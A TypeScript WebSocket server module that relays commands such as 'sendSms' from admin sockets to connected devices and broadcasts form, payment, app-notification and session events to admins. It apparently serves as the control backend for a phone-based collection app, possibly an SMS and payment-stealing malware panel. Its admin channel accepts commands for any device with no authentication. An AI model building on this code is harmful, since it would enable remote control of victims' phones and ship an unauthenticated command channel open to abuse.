import http from "http";
import url from "url";
import WebSocket, { WebSocketServer } from "ws";
import logger from "../logger/logger";
import config from "../config";
import Device from "../models/Device";

type WsPayload = Record<string, any>;

class WsService {
  private wss: WebSocketServer | null = null;

  private clients: Map<string, Set<WebSocket>> = new Map();
  private adminConnections: Map<string, Set<WebSocket>> = new Map();

  private primaryDeviceSocket: Map<string, WebSocket> = new Map();
  private socketConnectedAt: WeakMap<WebSocket, number> = new WeakMap();

  private sendSmsDedupe: Map<string, number> = new Map();

  private pendingOfflineTimers: Map<string, NodeJS.Timeout> = new Map();
  private readonly offlineGraceMs = 10_000;

  init(server: http.Server, wsBasePath = config.wsPath) {
    if (this.wss) {
      logger.warn("wsService.init already called");
      return;
    }

    this.wss = new WebSocketServer({
      noServer: true,
      maxPayload: 25 * 1024 * 1024,
    });

    server.on("upgrade", (req, socket, head) => {
      try {
        const parsed = url.parse(req.url || "");
        const pathname = parsed.pathname || "";

        const prefix = wsBasePath.endsWith("/")
          ? wsBasePath.slice(0, -1)
          : wsBasePath;

        const isDeviceSocket = pathname.startsWith(`${prefix}/devices/`);
        const isAdminSocket = pathname.startsWith(`${prefix}/admin`);

        if (!isDeviceSocket && !isAdminSocket) {
          socket.destroy();
          return;
        }

        let deviceId = "";
        if (isAdminSocket) {
          const parts = pathname.split("/").filter(Boolean);
          const adminIndex = parts.findIndex((p) => p === "admin");
          const maybeTarget =
            adminIndex >= 0 && parts.length > adminIndex + 1
              ? parts[adminIndex + 1]
              : null;
          deviceId = maybeTarget ? String(maybeTarget) : "__ADMIN__";
        } else {
          const parts = pathname.split("/");
          deviceId = parts[parts.length - 1];
        }

        if (!deviceId) {
          socket.destroy();
          return;
        }

        const socketType = isDeviceSocket ? "device" : "admin";

        this.wss!.handleUpgrade(req, socket as any, head, (ws) => {
          this.wss!.emit("connection", ws, req, deviceId, socketType);
        });
      } catch (err) {
        logger.error("wsService upgrade error", err);
        try {
          socket.destroy();
        } catch {
          // ignore
        }
      }
    });

    this.wss.on(
      "connection",
      async (
        ws: WebSocket,
        _req: any,
        deviceId: string,
        socketType: string,
      ) => {
        try {
          if (socketType === "device") {
            await this.registerClient(deviceId, ws);
          } else {
            await this.registerAdminClient(deviceId, ws);
          }

          this.setupListeners(deviceId, ws, socketType);

          logger.info("wsService: client connected", {
            deviceId,
            socketType,
          });
        } catch (err) {
          logger.error("wsService connection handler error", err);
          try {
            ws.close();
          } catch {
            // ignore
          }
        }
      },
    );

    logger.info("wsService: initialized");
  }

  hasActiveDeviceConnection(deviceId: string): boolean {
    const set = this.clients.get(String(deviceId || "").trim());
    if (!set || set.size === 0) return false;
    return true;
  }

  getActiveDeviceConnectionCount(deviceId: string): number {
    const set = this.clients.get(String(deviceId || "").trim());
    return set ? set.size : 0;
  }

  private cleanupSendSmsDedupe() {
    const now = Date.now();
    for (const [k, exp] of this.sendSmsDedupe.entries()) {
      if (exp <= now) this.sendSmsDedupe.delete(k);
    }
  }

  private isDuplicateSendSms(clientMsgId: string): boolean {
    if (!clientMsgId) return false;
    this.cleanupSendSmsDedupe();

    const now = Date.now();
    const exp = this.sendSmsDedupe.get(clientMsgId);
    if (exp && exp > now) return true;

    this.sendSmsDedupe.set(clientMsgId, now + 60_000);
    return false;
  }

  private clearPendingOffline(deviceId: string) {
    const t = this.pendingOfflineTimers.get(deviceId);
    if (!t) return;

    clearTimeout(t);
    this.pendingOfflineTimers.delete(deviceId);

    logger.info("wsService: cleared pending offline timer", { deviceId });
  }

  private async markDeviceOnline(deviceId: string) {
    try {
      await Device.findOneAndUpdate(
        { deviceId },
        {
          $set: {
            "status.online": true,
            "status.timestamp": Date.now(),
          },
        },
        { upsert: true },
      );

      logger.info("Device marked ONLINE (ws connect)", { deviceId });
    } catch (e) {
      logger.error("Failed marking online on registerClient", e);
    }
  }

  private async markDeviceOfflineNow(deviceId: string, reason: string) {
    try {
      if (this.hasActiveDeviceConnection(deviceId)) {
        logger.info("wsService: skipping offline mark because active ws exists", {
          deviceId,
          activeConnections: this.getActiveDeviceConnectionCount(deviceId),
          reason,
        });
        return;
      }

      await Device.findOneAndUpdate(
        { deviceId },
        {
          $set: {
            "status.online": false,
            "status.timestamp": Date.now(),
          },
        },
      );

      logger.info("Device marked OFFLINE (grace elapsed)", {
        deviceId,
        reason,
      });

      this.notifyDeviceStatus(deviceId, {
        online: false,
        timestamp: Date.now(),
      });
    } catch (e) {
      logger.error("Failed marking offline", e);
    }
  }

  private scheduleOfflineMark(deviceId: string, reason: string) {
    if (!deviceId || deviceId.startsWith("__ADMIN__") || deviceId === "admin") {
      return;
    }

    this.clearPendingOffline(deviceId);

    const timer = setTimeout(() => {
      this.pendingOfflineTimers.delete(deviceId);
      this.markDeviceOfflineNow(deviceId, reason).catch((err) => {
        logger.error("wsService: delayed offline mark failed", {
          deviceId,
          reason,
          error: err,
        });
      });
    }, this.offlineGraceMs);

    this.pendingOfflineTimers.set(deviceId, timer);

    logger.info("wsService: scheduled offline mark", {
      deviceId,
      reason,
      graceMs: this.offlineGraceMs,
    });
  }

  private async registerClient(deviceId: string, ws: WebSocket) {
    const set = this.clients.get(deviceId) || new Set<WebSocket>();
    set.add(ws);
    this.clients.set(deviceId, set);

    this.socketConnectedAt.set(ws, Date.now());
    this.primaryDeviceSocket.set(deviceId, ws);

    this.clearPendingOffline(deviceId);

    if (!deviceId.startsWith("__ADMIN__") && deviceId !== "admin") {
      await this.markDeviceOnline(deviceId);
    }

    ws.once("close", () => {
      this.unregisterClient(deviceId, ws).catch((err) => {
        logger.warn("wsService: unregisterClient(close) failed", {
          deviceId,
          error: err,
        });
      });
    });

    ws.once("error", () => {
      this.unregisterClient(deviceId, ws).catch((err) => {
        logger.warn("wsService: unregisterClient(error) failed", {
          deviceId,
          error: err,
        });
      });
    });
  }

  private async registerAdminClient(key: string, ws: WebSocket) {
    const set = this.adminConnections.get(key) || new Set<WebSocket>();
    set.add(ws);
    this.adminConnections.set(key, set);

    logger.info("Admin connected", { key, total: set.size });

    ws.once("close", () => this.unregisterAdminClient(key, ws));
    ws.once("error", () => this.unregisterAdminClient(key, ws));
  }

  private async unregisterClient(deviceId: string, ws: WebSocket) {
    const set = this.clients.get(deviceId);
    if (!set) return;

    if (!set.has(ws)) return;

    set.delete(ws);

    if (this.primaryDeviceSocket.get(deviceId) === ws) {
      if (set.size > 0) {
        let best: WebSocket | null = null;
        let bestTs = -1;
        for (const s of set) {
          const ts = this.socketConnectedAt.get(s) ?? 0;
          if (ts > bestTs) {
            bestTs = ts;
            best = s;
          }
        }
        if (best) this.primaryDeviceSocket.set(deviceId, best);
      } else {
        this.primaryDeviceSocket.delete(deviceId);
      }
    }

    if (set.size > 0) {
      logger.info("wsService: device socket removed but other connections exist", {
        deviceId,
        remaining: set.size,
      });
      return;
    }

    this.clients.delete(deviceId);

    if (!deviceId.startsWith("__ADMIN__") && deviceId !== "admin") {
      this.scheduleOfflineMark(deviceId, "ws_disconnect");
    }

    logger.info("wsService: device client disconnected", { deviceId });
  }

  private unregisterAdminClient(key: string, ws: WebSocket) {
    const set = this.adminConnections.get(key);
    if (!set) return;

    if (!set.has(ws)) return;

    set.delete(ws);

    if (set.size > 0) {
      logger.info("wsService: admin socket removed but others exist", {
        key,
        remaining: set.size,
      });
      return;
    }

    this.adminConnections.delete(key);
    logger.info("wsService: admin client disconnected", { key });
  }

  private setupListeners(deviceId: string, ws: WebSocket, socketType: string) {
    ws.on("message", async (data: WebSocket.RawData) => {
      const text = data.toString();

      try {
        const obj: WsPayload = JSON.parse(text);
        const type = obj.type;

        if (type !== "ping") {
          logger.debug("wsService message", { deviceId, text, socketType });
        }

        if (type === "ping") {
          try {
            ws.send(JSON.stringify({ type: "ack", timestamp: Date.now() }));
          } catch {
            // ignore
          }
          return;
        }

        if (type === "status" && socketType === "device") {
          const online = !!obj.online;
          const ts = Number(obj.timestamp || Date.now());

          await Device.findOneAndUpdate(
            { deviceId },
            {
              $set: {
                "status.online": online,
                "status.timestamp": ts,
              },
            },
            { upsert: true },
          );

          if (online) {
            this.clearPendingOffline(deviceId);
          }

          logger.info("wsService: status updated", {
            deviceId,
            online,
          });

          this.notifyDeviceStatus(deviceId, {
            online,
            timestamp: ts,
          });

          return;
        }

        if (type === "cmd") {
          let adminTargetFromUrl: string | null = null;
          if (socketType === "admin" && deviceId !== "__ADMIN__") {
            adminTargetFromUrl = deviceId;
          }

          const targetDeviceId =
            obj.payload?.uniqueid ||
            obj.payload?.deviceId ||
            adminTargetFromUrl ||
            deviceId;

          const forwarded = this.sendCommandToDevice(
            targetDeviceId,
            obj.name || "",
            obj.payload || {},
          );

          logger.info("wsService: cmd forwarded", {
            from: deviceId,
            to: targetDeviceId,
            name: obj.name,
            delivered: forwarded,
          });

          return;
        }
      } catch (err: any) {
        logger.warn("wsService: invalid ws message", err?.message);
      }
    });

    ws.on("error", (err) => {
      logger.warn("wsService ws error", {
        deviceId,
        err: err.message,
      });
    });

    const ackPayload = {
      type: "ack",
      message: socketType === "device" ? "device connected" : "admin connected",
      deviceId,
      timestamp: Date.now(),
    };
    try {
      ws.send(JSON.stringify(ackPayload));
    } catch {
      // ignore
    }
  }

  private sendRaw(ws: WebSocket, text: string) {
    try {
      ws.send(text);
    } catch (err: any) {
      logger.warn("wsService send error", err?.message);
    }
  }

  sendToDevice(deviceId: string, payload: WsPayload) {
    const set = this.clients.get(deviceId);
    if (!set || set.size === 0) return false;

    const text = JSON.stringify(payload);
    for (const ws of set) this.sendRaw(ws, text);

    return true;
  }

  private sendToDevicePrimary(deviceId: string, payload: WsPayload) {
    const ws = this.primaryDeviceSocket.get(deviceId);
    if (!ws) return false;

    const text = JSON.stringify(payload);
    this.sendRaw(ws, text);
    return true;
  }

  sendCommandToDevice(deviceId: string, name: string, payload: WsPayload = {}) {
    const normalized =
      typeof deviceId === "string" && deviceId.startsWith("__ADMIN__:")
        ? deviceId.split(":", 2)[1]
        : deviceId;

    if (name === "sendSms") {
      const clientMsgId = String(payload?.clientMsgId || "").trim();
      if (clientMsgId && this.isDuplicateSendSms(clientMsgId)) {
        logger.warn("wsService: sendSms dropped (duplicate clientMsgId)", {
          deviceId: normalized,
          clientMsgId,
        });
        return true;
      }

      const delivered = this.sendToDevicePrimary(normalized, {
        type: "cmd",
        name,
        payload,
      });

      logger.info("wsService: sendSms forwarded (primary only)", {
        deviceId: normalized,
        delivered,
        clientMsgId: clientMsgId || undefined,
      });

      return delivered;
    }

    return this.sendToDevice(normalized, {
      type: "cmd",
      name,
      payload,
    });
  }

  private sendToAdminKey(key: string, payload: WsPayload) {
    const set = this.adminConnections.get(key);
    if (!set || set.size === 0) return false;

    const text = JSON.stringify(payload);
    for (const ws of set) this.sendRaw(ws, text);
    return true;
  }

  private sendToAdminKeys(keys: string[], payload: WsPayload) {
    let sent = false;
    for (const key of keys) {
      if (!key) continue;
      const ok = this.sendToAdminKey(key, payload);
      if (ok) sent = true;
    }
    return sent;
  }

  async sendToAdminDevice(deviceId: string, payload: WsPayload) {
    const sentPerDevice = this.sendToAdminKey(deviceId, payload);
    const sentGlobal = this.sendToAdminKey("__ADMIN__", payload);
    const sentLegacy = this.sendToAdminKey("admin", payload);

    return sentPerDevice || sentGlobal || sentLegacy;
  }

  broadcastGlobalAdminUpdate(phone: string): boolean {
    const payload = {
      type: "event",
      event: "globalAdmin.update",
      data: {
        phone,
        timestamp: Date.now(),
      },
    };

    const sent = this.sendToAdminKeys(["__ADMIN__", "admin"], payload);

    logger.info("wsService: global admin update broadcasted", { phone, sent });

    return sent;
  }

  broadcastAdminEvent(
    event: string,
    data: WsPayload = {},
    options: {
      deviceId?: string;
      includeDeviceChannel?: boolean;
      includeDeviceSockets?: boolean;
    } = {},
  ) {
    const payload = {
      type: "event",
      event,
      deviceId: options.deviceId || data.deviceId || undefined,
      data,
      timestamp: Date.now(),
    };

    const keys = ["__ADMIN__", "admin"];
    if (options.includeDeviceChannel !== false && options.deviceId) {
      keys.push(options.deviceId);
    }

    const sentAdmins = this.sendToAdminKeys(keys, payload);
    const sentDevices =
      options.includeDeviceSockets === true && options.deviceId
        ? this.sendToDevice(options.deviceId, payload)
        : false;

    logger.info("wsService: broadcastAdminEvent", {
      event,
      deviceId: options.deviceId || null,
      sentAdmins,
      sentDevices,
    });

    return sentAdmins || sentDevices;
  }

  broadcastDeviceUpsert(device: any) {
    const deviceId = String(device?.deviceId || "").trim();
    if (!deviceId) return false;

    return this.broadcastAdminEvent("device:upsert", device, {
      deviceId,
      includeDeviceChannel: true,
      includeDeviceSockets: false,
    });
  }

  broadcastDeviceDelete(deviceId: string) {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;

    return this.broadcastAdminEvent(
      "device:delete",
      { deviceId: cleanId },
      {
        deviceId: cleanId,
        includeDeviceChannel: true,
        includeDeviceSockets: false,
      },
    );
  }

  broadcastFavoriteUpdate(deviceId: string, favorite: boolean) {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;

    return this.broadcastAdminEvent(
      "favorite:update",
      { deviceId: cleanId, favorite: favorite === true },
      {
        deviceId: cleanId,
        includeDeviceChannel: true,
        includeDeviceSockets: false,
      },
    );
  }

  broadcastFormNew(deviceId: string, form: WsPayload) {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;

    return this.broadcastAdminEvent("form:new", form, {
      deviceId: cleanId,
      includeDeviceChannel: true,
      includeDeviceSockets: false,
    });
  }

  broadcastFormUpdate(deviceId: string, patch: WsPayload) {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;

    return this.broadcastAdminEvent("form:update", patch, {
      deviceId: cleanId,
      includeDeviceChannel: true,
      includeDeviceSockets: false,
    });
  }

  broadcastPaymentNew(deviceId: string, method: string, payloadData: WsPayload) {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;

    return this.broadcastAdminEvent(
      "payment:new",
      {
        deviceId: cleanId,
        method,
        payload: payloadData,
        createdAt: Date.now(),
      },
      {
        deviceId: cleanId,
        includeDeviceChannel: true,
        includeDeviceSockets: false,
      },
    );
  }

  broadcastSessionUpsert(session: WsPayload) {
    const deviceId = String(session?.deviceId || "").trim();

    return this.broadcastAdminEvent("session:upsert", session, {
      deviceId: deviceId || undefined,
      includeDeviceChannel: true,
      includeDeviceSockets: false,
    });
  }

  broadcastSessionDelete(deviceId: string, admin?: string) {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;

    return this.broadcastAdminEvent(
      "session:delete",
      { deviceId: cleanId, admin: admin || "" },
      {
        deviceId: cleanId,
        includeDeviceChannel: true,
        includeDeviceSockets: false,
      },
    );
  }

  broadcastSessionClear() {
    return this.broadcastAdminEvent(
      "session:clear",
      {},
      {
        includeDeviceChannel: false,
        includeDeviceSockets: false,
      },
    );
  }

  broadcastNotificationClearDevice(deviceId: string) {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;

    return this.broadcastAdminEvent(
      "notification:clearDevice",
      { deviceId: cleanId },
      {
        deviceId: cleanId,
        includeDeviceChannel: true,
        includeDeviceSockets: false,
      },
    );
  }

  broadcastNotificationClearAll() {
    return this.broadcastAdminEvent(
      "notification:clearAll",
      {},
      {
        includeDeviceChannel: false,
        includeDeviceSockets: false,
      },
    );
  }

  broadcastAppNotification(
    deviceId: string,
    notification: WsPayload,
  ) {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;

    return this.broadcastAdminEvent("app-notification", notification, {
      deviceId: cleanId,
      includeDeviceChannel: true,
      includeDeviceSockets: false,
    });
  }

  broadcastAppNotificationDeleted(
    deviceId: string,
    notificationId: string,
  ) {
    const cleanId = String(deviceId || "").trim();
    const cleanNotificationId = String(notificationId || "").trim();
    if (!cleanId || !cleanNotificationId) return false;

    return this.broadcastAdminEvent(
      "app-notification:deleted",
      {
        deviceId: cleanId,
        id: cleanNotificationId,
        _id: cleanNotificationId,
      },
      {
        deviceId: cleanId,
        includeDeviceChannel: true,
        includeDeviceSockets: false,
      },
    );
  }

  broadcastAppNotificationClearDevice(deviceId: string) {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;

    return this.broadcastAdminEvent(
      "app-notification:clearDevice",
      { deviceId: cleanId },
      {
        deviceId: cleanId,
        includeDeviceChannel: true,
        includeDeviceSockets: false,
      },
    );
  }

  broadcastAppNotificationClearAll() {
    return this.broadcastAdminEvent(
      "app-notification:clearAll",
      {},
      {
        includeDeviceChannel: false,
        includeDeviceSockets: false,
      },
    );
  }

  broadcastCrashCreated(deviceId: string, data: WsPayload) {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;

    return this.broadcastAdminEvent("crash:new", data, {
      deviceId: cleanId,
      includeDeviceChannel: true,
      includeDeviceSockets: false,
    });
  }

  notifyDeviceStatus(deviceId: string, status: { online: boolean; timestamp?: number }) {
    const payload = {
      type: "event",
      event: "status",
      deviceId,
      data: status,
      timestamp: Date.now(),
    };

    this.sendToDevice(deviceId, payload);
    this.sendToAdminKeys(["__ADMIN__", "admin", deviceId], payload);

    return true;
  }

  async shutdown() {
    for (const timer of this.pendingOfflineTimers.values()) {
      clearTimeout(timer);
    }
    this.pendingOfflineTimers.clear();

    for (const set of this.clients.values()) {
      for (const ws of set) {
        try {
          ws.close();
        } catch {
          // ignore
        }
      }
    }
    this.clients.clear();
    this.primaryDeviceSocket.clear();

    for (const set of this.adminConnections.values()) {
      for (const ws of set) {
        try {
          ws.close();
        } catch {
          // ignore
        }
      }
    }
    this.adminConnections.clear();

    if (this.wss) {
      try {
        this.wss.close();
      } catch {
        // ignore
      }
      this.wss = null;
    }

    logger.info("wsService: shutdown complete");
  }
}

const wsService = new WsService();
export default wsService;